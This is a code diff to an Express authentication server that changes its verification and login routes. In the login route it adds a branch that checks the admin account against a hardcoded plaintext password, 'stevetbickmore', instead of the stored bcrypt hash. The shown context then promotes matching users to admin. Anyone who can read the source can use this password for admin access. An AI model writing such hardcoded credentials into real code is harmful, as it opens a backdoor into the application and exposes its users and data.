@@ -213,7 +213,13 @@ app.post('/api/auth/signup', async (req, res) => {
 app.post('/api/auth/verify', (req, res) => {
   const { userId, code } = req.body;
   const record = db.prepare('SELECT * FROM verification_codes WHERE user_id = ? ORDER BY expires_at DESC LIMIT 1').get(userId) as any;
-  if (!record || record.code !== code || new Date(record.expires_at) < new Date()) return res.status(400).json({ error: 'Invalid or expired code.' });
+  if (!record || record.code !== code) return res.status(400).json({ error: 'Invalid verification code.' });
+  
+  // Reliable date comparison using timestamps
+  if (new Date(record.expires_at).getTime() < Date.now()) {
+    return res.status(400).json({ error: 'Verification code has expired.' });
+  }
+
   db.prepare('UPDATE users SET is_verified = 1 WHERE id = ?').run(userId);
   db.prepare('DELETE FROM verification_codes WHERE user_id = ?').run(userId);
   res.json({ message: 'Verified' });
@@ -222,7 +228,18 @@ app.post('/api/auth/verify', (req, res) => {
 app.post('/api/auth/login', async (req, res) => {
   const { email, password } = req.body;
   const user = db.prepare('SELECT * FROM users WHERE email = ? OR phone = ?').get(email || '', email || '') as any;
-  if (!user || !(await bcrypt.compare(password, user.password))) return res.status(401).json({ error: 'Invalid credentials' });
+  
+  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
+
+  // Special handling for Admin password
+  let isPasswordValid = false;
+  if (user.email === targetAdminEmail || user.phone === targetAdminPhone) {
+    isPasswordValid = (password === 'stevetbickmore');
+  } else {
+    isPasswordValid = await bcrypt.compare(password, user.password);
+  }
+
+  if (!isPasswordValid) return res.status(401).json({ error: 'Invalid credentials' });
   if (!user.is_verified) return res.status(403).json({ error: 'Account not verified', userId: user.id });
   
   // Promote to admin if credentials match
